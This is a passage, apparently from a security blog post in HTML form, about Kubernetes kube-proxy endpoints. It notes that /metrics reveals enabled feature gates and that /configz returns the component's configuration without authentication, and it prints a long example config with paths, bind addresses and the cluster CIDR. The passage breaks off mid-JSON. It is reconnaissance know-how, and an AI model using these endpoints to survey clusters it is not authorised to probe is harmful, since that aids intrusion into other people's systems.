&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/metrics&lt;/code&gt; endpoint returns a large list of information about the host and cluster’s metrics, in Prometheus format. One thing that caught my eye when looking through the output is that it provides information on what Alpha and beta features are enabled by the cluster. I’m not sure why this information is included in a Node component API, but if you’re surveying a cluster (particularly a managed k8s cluster where you don’t have access to the control plane) it could be of interest.&lt;/p&gt;

&lt;p&gt;An excerpt of the output about features looks like this&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubernetes_feature_enabled{name=&quot;APIListChunking&quot;,stage=&quot;&quot;} 1
kubernetes_feature_enabled{name=&quot;APIPriorityAndFairness&quot;,stage=&quot;&quot;} 1
kubernetes_feature_enabled{name=&quot;APIResponseCompression&quot;,stage=&quot;BETA&quot;} 1
kubernetes_feature_enabled{name=&quot;APIServerIdentity&quot;,stage=&quot;BETA&quot;} 1
kubernetes_feature_enabled{name=&quot;APIServerTracing&quot;,stage=&quot;BETA&quot;} 1
kubernetes_feature_enabled{name=&quot;APIServingWithRoutine&quot;,stage=&quot;BETA&quot;} 1
kubernetes_feature_enabled{name=&quot;AdmissionWebhookMatchConditions&quot;,stage=&quot;&quot;} 1
kubernetes_feature_enabled{name=&quot;AggregatedDiscoveryEndpoint&quot;,stage=&quot;&quot;} 1
kubernetes_feature_enabled{name=&quot;AllAlpha&quot;,stage=&quot;ALPHA&quot;} 0
kubernetes_feature_enabled{name=&quot;AllBeta&quot;,stage=&quot;BETA&quot;} 0
kubernetes_feature_enabled{name=&quot;AllowServiceLBStatusOnNonLB&quot;,stage=&quot;DEPRECATED&quot;} 0
kubernetes_feature_enabled{name=&quot;AnyVolumeDataSource&quot;,stage=&quot;BETA&quot;} 1
kubernetes_feature_enabled{name=&quot;AppArmor&quot;,stage=&quot;BETA&quot;} 1
kubernetes_feature_enabled{name=&quot;AppArmorFields&quot;,stage=&quot;BETA&quot;} 1
kubernetes_feature_enabled{name=&quot;CPUManager&quot;,stage=&quot;&quot;} 1
kubernetes_feature_enabled{name=&quot;CPUManagerPolicyAlphaOptions&quot;,stage=&quot;ALPHA&quot;} 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Another interesting endpoint is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/configz&lt;/code&gt; this one returns the configuration of the component without any authentication. The example below comes from a Kubeadm cluster and as you can see there’s some information disclosure including physical paths.&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;kubeproxy.config.k8s.io&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;FeatureGates&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ClientConnection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Kubeconfig&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/var/lib/kube-proxy/kubeconfig.conf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;AcceptContentTypes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ContentType&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;application/vnd.kubernetes.protobuf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;QPS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Burst&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Logging&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;format&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;flushFrequency&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;5s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;verbosity&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;options&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;infoBufferSize&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;infoBufferSize&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;HostnameOverride&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kind-control-plane&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;BindAddress&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0.0.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;HealthzBindAddress&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0.0.0.0:10256&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;MetricsBindAddress&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;127.0.0.1:10249&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;BindAddressHardFail&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;EnableProfiling&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ShowHiddenMetricsForVersion&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Mode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;iptables&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;IPTables&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;MasqueradeBit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;MasqueradeAll&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;LocalhostNodePorts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;SyncPeriod&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;30s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;MinSyncPeriod&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1s&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;IPVS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;SyncPeriod&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;30s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;MinSyncPeriod&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Scheduler&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ExcludeCIDRs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;StrictARP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;TCPTimeout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;TCPFinTimeout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;UDPTimeout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0s&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Winkernel&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;NetworkName&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;SourceVip&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;EnableDSR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;RootHnsEndpointName&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ForwardHealthCheckVip&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;NFTables&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;MasqueradeBit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;MasqueradeAll&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;SyncPeriod&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;30s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;MinSyncPeriod&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1s&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;DetectLocalMode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ClusterCIDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;DetectLocal&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;BridgeInterface&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;InterfaceNamePrefix&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ClusterCIDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.244.0.0/16&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;NodePortAddresses&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;OOMScoreAdj&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;-999&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Conntrack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;MaxPerCore&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Min&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;131072&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;TCPEstablishedTimeout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;24h0m0s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;TCPCloseWaitTimeout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1h0m0s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;TCPBeLiberal&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;UDPTimeout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
